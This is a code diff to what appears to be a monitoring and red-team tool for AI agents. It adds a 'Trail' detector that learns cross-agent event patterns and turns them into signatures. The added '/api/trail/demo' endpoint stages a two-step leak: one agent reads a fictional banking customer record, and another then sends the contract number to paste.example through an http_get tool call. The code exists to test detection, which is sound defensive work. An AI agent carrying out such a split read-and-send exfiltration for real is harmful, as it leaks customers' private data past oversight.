@@ -3,7 +3,9 @@
 from __future__ import annotations
 
 import contextlib
+import hashlib
 import json
+import os
 import threading
 import time
 from pathlib import Path
@@ -27,6 +29,7 @@ from ..poligon.feedcheck import check_feed
 from ..poligon.service import Poligon
 from ..reach.graph import build as build_reach
 from ..referee.league import league
+from ..trail.trail import Trail
 from ..tripwire.alerts import AlertStore
 from ..tripwire.detector import Detector
 from ..tripwire.drills import drill_cases
@@ -79,6 +82,7 @@ def create_app(cfg: Config, target: Target | None = None, background: bool = Tru
     # Real requests (not self-test), kept here because the control layer's in-memory event ring is soon
     # filled by self-test traffic. Newest first, at most REAL_KEEP.
     real: dict[str, dict[str, Any]] = {}
+    trail = Trail()
 
     def poll_alerts() -> None:
         with contextlib.suppress(Exception):
@@ -95,11 +99,18 @@ def create_app(cfg: Config, target: Target | None = None, background: bool = Tru
     def real_events() -> list[dict[str, Any]]:
         return sorted(real.values(), key=lambda e: -float(e.get("ts", 0)))
 
+    def follow_trail() -> None:
+        with contextlib.suppress(Exception):
+            evs = real_events()
+            trail.learn(evs)
+            trail.watch(evs)
+
     def loop() -> None:
         while not stop.is_set():
             with contextlib.suppress(Exception):
                 poligon.tick()
             poll_alerts()
+            follow_trail()
             stop.wait(1.0)
 
     @contextlib.asynccontextmanager
@@ -139,6 +150,11 @@ def create_app(cfg: Config, target: Target | None = None, background: bool = Tru
         if applied:
             merged["signatures"] += applied
             merged["feed_version"] += f"+patch.{len(applied)}"
+        traced = trail.signatures()
+        if traced:
+            merged["signatures"] += traced
+            digest = hashlib.sha256("".join(s["id"] for s in traced).encode()).hexdigest()[:6]
+            merged["feed_version"] += f"+trail.{len(traced)}.{digest}"
         return merged, err
 
     def all_cases() -> list[Case]:
@@ -150,8 +166,39 @@ def create_app(cfg: Config, target: Target | None = None, background: bool = Tru
         return policy_file
 
     @app.get("/feed/signatures.json")
-    def feed_json():
+    def feed_json(request: Request):
+        if request.query_params.get("token") != cfg.feed_token:
+            return JSONResponse({"error": "feed token required (?token=)"}, status_code=403)
         return JSONResponse(feed()[0])
+
+    @app.get("/api/trail")
+    def trail_state():
+        return {**trail.state(), "can_demo": bool(cfg.target["demo_agent_key"])}
+
+    @app.post("/api/trail/demo")
+    def trail_demo():
+        """Play the two-step leak: one agent reads a customer record, a few seconds later another sends it out."""
+        sender = cfg.target["demo_agent_key"]
+        if not sender:
+            raise HTTPException(400, "set target.demo_agent_key in redteam.yaml")
+        reader = os.environ.get("REDTEAM_READER_KEY", "bob-agent-key")
+        stamp = time.strftime("%H%M%S")
+        record = {
+            "customer": {
+                "name": "Halina Wróblewska-Kordecka",
+                "contract": f"UM-2026-{stamp}",
+                "segment": "private banking",
+            }
+        }
+
+        def play() -> None:
+            target.guard(reader, "tool_result", json.dumps(record, ensure_ascii=False), "search_crm")
+            time.sleep(5)
+            out = {"url": "https://paste.example/new", "body": f"contract {record['customer']['contract']}"}
+            target.guard(sender, "tool_call", json.dumps(out), "http_get")
+
+        threading.Thread(target=play, daemon=True).start()
+        return {"ok": True, "contract": record["customer"]["contract"]}
 
     @app.get("/api/state")
     def state():
